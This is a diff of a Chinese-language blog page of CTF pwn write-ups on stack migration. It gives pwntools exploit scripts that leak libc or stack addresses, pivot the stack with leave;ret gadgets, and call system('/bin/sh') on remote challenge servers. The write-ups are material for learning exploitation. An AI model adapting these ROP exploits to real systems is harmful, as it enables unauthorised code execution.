class="hljs-string">b&#x27;plz:\n&#x27;</span>,p2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
 <p><strong><font style="color:#DF2A3F;"></font></strong></p>
 <p><strong><font style="color:#DF2A3F;">方法2：leak_libc_base+栈迁移</font></strong></p>
@@ -680,34 +669,58 @@
 <p>exp如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27066</span>)<br><br>main = <span class="hljs-number">0x4012ac</span><br>ret  = <span class="hljs-number">0x40101a</span><br>leave = <span class="hljs-number">0x4012aa</span><br>pop_rdi =  <span class="hljs-number">0x401333</span><br>offset = <span class="hljs-number">0x50</span><br><span class="hljs-comment"># 第一次发送数据利用printf函数泄露一个函数地址</span><br>io.sendafter(<span class="hljs-string">b&#x27;name:\n&#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>) <br>_IO_file_jumps =u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(_IO_file_jumps))<br><span class="hljs-comment"># 获得栈地址</span><br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>((io.recv(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>,_IO_file_jumps)<br>libc_base = _IO_file_jumps-libc.dump(<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>)<br>sys = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">bin</span> = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>p2 = (p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)).ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p2 += p64(stack) +p64(leave)<br><br>io.sendafter(<span class="hljs-string">b&#x27;plz:\n&#x27;</span>,p2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<h4 id="八字节能干什么"><a href="#八字节能干什么" class="headerlink" title="八字节能干什么"></a><font style="color:rgba(0, 0, 0, 0.85);">八字节能干什么</font></h4><blockquote>
-<p>题源：PolarD&amp;N-PWN</p>
-</blockquote>
-<h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><p>首先有两次输入机会，并且 ebp 和 ebp+4 可以控制。给出了system(‘ls’)；可以调用system函数。</p>
+<h4 id="euX4P"><font style="color:rgba(0, 0, 0, 0.85);">八字节能干什么</font></h4>
+> 题源：PolarD&N-PWN
+>
+
+<h5 id="twBtO">源码</h5>
+首先有两次输入机会，并且 ebp 和 ebp+4 可以控制。给出了system('ls')；可以调用system函数。
+
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625334763-bf872cff-e026-4fa9-b915-e24b5046a73b.png" srcset="/img/loading.gif" lazyload></p>
-<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>第一次输入填充垃圾数据，利用printf函数泄露 ebp 的内容，然后 减去 偏移得到栈地址。</p>
+<h5 id="ANb77">分析</h5>
+第一次输入填充垃圾数据，利用printf函数泄露 ebp 的内容，然后 减去 偏移得到栈地址。
+
 <p>第二次构造ROP链，利用read向栈读入 &#x2F;bin&#x2F;sh\x00 参数 构造 system(‘&#x2F;bin&#x2F;sh’)后面函数。ebp填充栈地址，然后填充leave；ret 进行栈迁移，使得程序再次从栈地址运行，获取shell。</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1706625502204-84a14677-bbf1-4fe2-9df4-07ec66686f95.png" srcset="/img/loading.gif" lazyload></p>
-<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;120.46.59.242&#x27;</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#io = process(&#x27;./1&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br>io.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><br>ebp_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>stack = ebp_addr-<span class="hljs-number">0x40</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>leave = <span class="hljs-number">0x8048488</span><br>sys = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p1 = (<span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(sys) + p32(<span class="hljs-number">1</span>) + p32(stack+<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span> ).ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment">#注意\x00防止截断，否则出错。并且stack处不能填充b&#x27;/bin/sh&#x27;</span><br>p1 += p32(stack) + p32(leave)<br><br>io.send(p1)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h5 id="PAL2Z">exp：</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>io = remote(<span class="hljs-string">&#x27;120.46.59.242&#x27;</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#io = process(&#x27;./1&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br>io.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><br>ebp_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>stack = ebp_addr-<span class="hljs-number">0x40</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>leave = <span class="hljs-number">0x8048488</span><br>sys = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p1 = (<span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(sys) + p32(<span class="hljs-number">1</span>) + p32(stack+<span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;/bin/sh&#x27;</span> ).ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment">#注意\x00防止截断，否则出错。并且stack处不能填充b&#x27;/bin/sh&#x27;</span><br>p1 += p32(stack) + p32(leave)<br><br>io.send(p1)<br>io.interactive()<br></code></pre></td></tr></table></figure>
 
-<h3 id="栈地址未知-1"><a href="#栈地址未知-1" class="headerlink" title="栈地址未知"></a>栈地址未知</h3><blockquote>
-<p>此时将栈迁移到bss段，或者需要利用read进行任意地址写。</p>
-<p>与栈地址可知最大的区别：</p>
-<p><strong>通常第一次payload 的rip&#x2F;eip填充的都是主函数代码复用read等片段</strong>，此时需要注意**<font style="color:#7E45E8;">第二次payload填充时候是从fake_rbp-buf 地址开始写入，并且溢出字节依然有限</font>**，<font style="color:#D22D8D;">通常需要多次payload和使用leave地址。</font></p>
-</blockquote>
-<h4 id="stack-migration-revenge"><a href="#stack-migration-revenge" class="headerlink" title="stack migration revenge"></a><font style="color:rgb(33, 37, 41);">stack migration revenge</font></h4><blockquote>
-<p>题源：BUUCTF-PWN（ <font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道] </font>)</p>
-</blockquote>
-<h5 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h5><p>反汇编得到主要功能函数代码</p>
+<h3 id="IDCV2">栈地址未知</h3>
+> 此时将栈迁移到bss段，或者需要利用read进行任意地址写。
+>
+> 与栈地址可知最大的区别：
+>
+> **通常第一次payload 的rip/eip填充的都是主函数代码复用read等片段**，此时需要注意**<font style="color:#7E45E8;">第二次payload填充时候是从fake_rbp-buf 地址开始写入，并且溢出字节依然有限</font>**，<font style="color:#D22D8D;">通常需要多次payload和使用leave地址。</font>
+>
+
+<h4 id="wBSlt"><font style="color:rgb(33, 37, 41);">stack migration revenge</font></h4>
+> 题源：BUUCTF-PWN（ <font style="color:rgb(33, 37, 41);">[NewStarCTF 2023 公开赛道] </font>)
+>
+
+<h5 id="feShf">源码</h5>
+反汇编得到主要功能函数代码
+
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123197057-70bd5a85-6479-452d-b04b-f13ca979ef22.png" srcset="/img/loading.gif" lazyload></p>
 <p>查看汇编代码获取调用read函数的代码段地址，便于后续利用read写入数据，同时减少了调用read_plt需要传参的问题。</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123202931-fb0a2d97-986b-400b-8ca8-21b5269722cd.png" srcset="/img/loading.gif" lazyload></p>
 <p>查看可写代码段bss地址，选用大于0x404070并且小于0x405000的位置布置rop。</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123206113-46d449c7-7853-4ba0-82d4-31a631690d24.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2024/png/34628707/1707123628067-5bde1dff-294d-43c0-bfc4-f186a6749ad3.png" srcset="/img/loading.gif" lazyload></p>
-<h5 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h5><h5 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26923</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>offset = <span class="hljs-number">0x50</span><br><br>bss = <span class="hljs-number">0x405000</span>-<span class="hljs-number">0x900</span><br>read = <span class="hljs-number">0x4011ff</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rbp = <span class="hljs-number">0x40115d</span><br>leave = <span class="hljs-number">0x401227</span><br>pop_rdi = <span class="hljs-number">0x4012b3</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset  + p64(bss+<span class="hljs-number">0x50</span>) + p64(read)<br>r.sendafter(<span class="hljs-string">b&#x27;just chat with me:\n&#x27;</span>,payload)<br><span class="hljs-comment"># 第二次payload会调用read从rbp-0x50即 bss地址开始写入</span><br><br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>p2 += p64(pop_rbp) + p64(bss+<span class="hljs-number">0x800</span>) + p64(read)<br>p2 = p2.ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(bss) + p64(leave)<br>r.sendafter(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>,p2)<br> <span class="hljs-comment"># p64(bss) + p64(leave) :将rbp转到bss地址，此时栈结构：</span><br><br><span class="hljs-comment"># rbp     aaaaaaaa</span><br><span class="hljs-comment"># rip    p64(pop_rdi) + p64(puts_got) + p64(puts_plt)     -----leak_addr</span><br><span class="hljs-comment"># rip-&gt;rip    p64(pop_rbp) + p64(bss+0x800) + p64(read)</span><br><span class="hljs-comment">#       栈迁移第二个输入点，用于向 bss+0x750地址 填充system(/bin/sh)</span><br>r.recvuntil(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>)<br>puts =u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload =p64(pop_rdi) +p64(binsh_addr) +p64(system_addr)<br>payload =payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(bss +<span class="hljs-number">0x800</span> -<span class="hljs-number">0x58</span>) +p64(leave)<br><span class="hljs-comment"># 再次调转执行，从 bss+0x748开始，由于该地址为无关数据，有效地址从bss+0x750开始，因此 执行system(/bin/sh)</span><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+<h5 id="ap2uo">构造rop链</h5>
 
-<h4 id="pwn271"><a href="#pwn271" class="headerlink" title="pwn271"></a>pwn271</h4><p>参见 pwn 入门 wp，结合上面漏洞利用 32 位程序。</p>
+
+
+
+<h5 id="HZKCs">exp：</h5>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26923</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>offset = <span class="hljs-number">0x50</span><br><br>bss = <span class="hljs-number">0x405000</span>-<span class="hljs-number">0x900</span><br>read = <span class="hljs-number">0x4011ff</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rbp = <span class="hljs-number">0x40115d</span><br>leave = <span class="hljs-number">0x401227</span><br>pop_rdi = <span class="hljs-number">0x4012b3</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset  + p64(bss+<span class="hljs-number">0x50</span>) + p64(read)<br>r.sendafter(<span class="hljs-string">b&#x27;just chat with me:\n&#x27;</span>,payload)<br><span class="hljs-comment"># 第二次payload会调用read从rbp-0x50即 bss地址开始写入</span><br><br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>  + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)<br>p2 += p64(pop_rbp) + p64(bss+<span class="hljs-number">0x800</span>) + p64(read)<br>p2 = p2.ljust(offset,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(bss) + p64(leave)<br>r.sendafter(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>,p2)<br> <span class="hljs-comment"># p64(bss) + p64(leave) :将rbp转到bss地址，此时栈结构：</span><br><br><span class="hljs-comment"># rbp     aaaaaaaa</span><br><span class="hljs-comment"># rip    p64(pop_rdi) + p64(puts_got) + p64(puts_plt)     -----leak_addr</span><br><span class="hljs-comment"># rip-&gt;rip    p64(pop_rbp) + p64(bss+0x800) + p64(read)</span><br><span class="hljs-comment">#       栈迁移第二个输入点，用于向 bss+0x750地址 填充system(/bin/sh)</span><br>r.recvuntil(<span class="hljs-string">b&#x27;so funny\n&#x27;</span>)<br>puts =u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts)<br>libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload =p64(pop_rdi) +p64(binsh_addr) +p64(system_addr)<br>payload =payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(bss +<span class="hljs-number">0x800</span> -<span class="hljs-number">0x58</span>) +p64(leave)<br><span class="hljs-comment"># 再次调转执行，从 bss+0x748开始，由于该地址为无关数据，有效地址从bss+0x750开始，因此 执行system(/bin/sh)</span><br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="o0gGi">pwn271</h4>
+参见 pwn 入门 wp，结合上面漏洞利用 32 位程序。
+
+
+
+
+
 
                 
               </div>
@@ -717,13 +730,6 @@
               <div class="post-metas my-3">
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/span-class-label-label-primary-stack-migration-span/" class="print-no-link">#<span class="label label-primary">stack_migration</span></a>
-      
-    </div>
-  
 </div>
 
 
@@ -732,8 +738,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Stack_migration</div>
-      <div>https://12yhy3.github.io/2024/11/25/stack_migrant/</div>
+      <div></div>
+      <div>https://12yhy3.github.io/2024/11/28/Stack_migrantion/</div>
     </div>
     <div class="license-meta">
       
@@ -745,7 +751,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年11月25日</div>
+          <div>2024年11月28日</div>
         </div>
       
       
@@ -777,18 +783,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/11/25/test/" title="test">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">test</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/11/25/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2024/11/25/test/" title="test">
+                        <span class="hidden-mobile">test</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
